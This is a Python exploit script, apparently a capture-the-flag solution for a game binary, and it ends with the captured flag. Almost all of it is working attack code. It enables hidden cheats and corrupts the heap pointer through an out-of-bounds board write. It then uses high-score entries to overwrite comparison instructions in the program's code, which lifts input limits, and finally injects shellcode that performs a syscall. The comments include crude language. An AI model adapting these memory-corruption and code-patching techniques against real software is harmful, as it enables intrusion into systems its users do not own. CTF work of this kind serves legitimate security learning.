import interact

p = interact.Process()

def startgame():
	p.send('\n')

def suicide(name=''):
	# kill ourself and enter empty highscore name
	p.send('                    ' + name + '\n')

def precisionSuicide(name=''):
	# KILL OURSELF WITH PRECISION!!!!! HIT IT WITH >>>PRECISION<<<!!!!!!
	# kill ourself and enter empty highscore name
	p.send(('Iz ' * 4) + ('O ' * 2) + name + '\n')

def enablecheats():
	startgame()
	suicide()
	startgame()
	suicide()
	startgame()
	p.send('azzzaaaaa aaa aaa aaaacazddd aaazazza aaa acaaazaa aaa acazaaaa acazaaaaa cazaaaaa dczaaa daaaddaaa azaaaa zaaaaaa dazaaa  zzzaa dddd ddddd dddcdddd')
	suicide()

def do_corruption():
	# corrupt heap_top by OoB board
	p.send('\nOzzzaaaasssssssssssssssssI')
	suicide()
	# now heap_top = 0x40012c in malloc

def get_highscore(i, name=''):
	startgame()
	for _ in range(1 + i//9):
		# p.send('Oaaaaa ')
		p.send('Oaaaaa ')
		p.send('Oaaa ')
		p.send('Oa ')
		p.send('Od ')
		p.send('Oddd ')
		p.send('Oddddd ')
	for _ in range(i%9):
		p.send('Oaaaaa ')
	suicide(name)

def corrupt_checkhighscore():
	# We are at 0x40012c, we want to go to 4001c8
	games = (0x4001c8-0x40012c)//4
	for i in range(games-1):
		get_highscore(i)

	# .text:00000000004001C5 83 7D FC 05  cmp     [rbp+var_4], 5
	# .text:00000000004001C9 75 0A        jnz     short loc_4001D5
	# Overwrite with 'A' to
	# .text:00000000004001C5 83 7D FC 41  cmp     [rbp+var_4], 'A'
	# .text:00000000004001C9 75 0A        jnz     short loc_4001D5
	get_highscore(games, name='A')

def corrupt_more_shit():
	# We are at 0x4001cc. We want to go to 0x400260
	for i in range((0x400260-0x4001cc)//4):
		startgame()
		precisionSuicide()
	# .text:000000000040025D 80 7D F7 40  cmp     [rbp+var_9], 40h ;   <-- 40h replaced with 1
	# .text:0000000000400261 7E 31        jle     short loc_400294 ; SIGNED COMPARISON, goes to add al, 0x31 (effective NOP)
	startgame()
	precisionSuicide('A\x7f\x01\x04')
	# Now we can use low bytes!!!
	# WE MUST ALSO USE PRECISIONSUICIDE FROM NOW ON

	# Now are at 0x400264, go to 0x400268
	startgame()
	precisionSuicide('')

	# .text:0000000000400263 80 7D F7 5A  cmp     [rbp+var_9], 5Ah ; 'Z'
	# .text:0000000000400267 7F 2B        jg      short loc_400294 <---7F 06 jg sice
	startgame()
	precisionSuicide('\x06')
	# Now we can have high bytes!!

	# Now are at 0x40026c
	# .text:0000000000400269 83 7D F8 02  cmp     [rbp+var_8], 2 <-- fuck length limit to 41
	# .text:000000000040026D 7F 25        jg      short loc_400294 SIGNED COMPARISON!!!!!
	startgame()
	precisionSuicide('\x41')
	# Now we can enter 41 characters at a time

	# Now are at 0x400270 and we need to go to 0x400318
	for i in range((0x400318-0x400270)//4):
		startgame()
		precisionSuicide()

	shellcode = ''
	shellcode += '\xB8\x19\x25\x20\x20' # mov eax, 0x20202519
	shellcode += '\x35\x20\x20\x20\x20' # xor eax, 0x20202020
	shellcode += '\xBF\x41\x41\x41\x41' # mov edi, 0x41414141
	shellcode += '\x0F\x05' # syscall
	shellcode += '\xc9\xc3' # leave; ret

	startgame()
	precisionSuicide(shellcode)

enablecheats()
do_corruption()
corrupt_checkhighscore()
corrupt_more_shit()

p.interactive()


# flag{s0m3t1mes_y0u_n33d_t0_wr1t3_y0ur_0wn_kill_scr33n}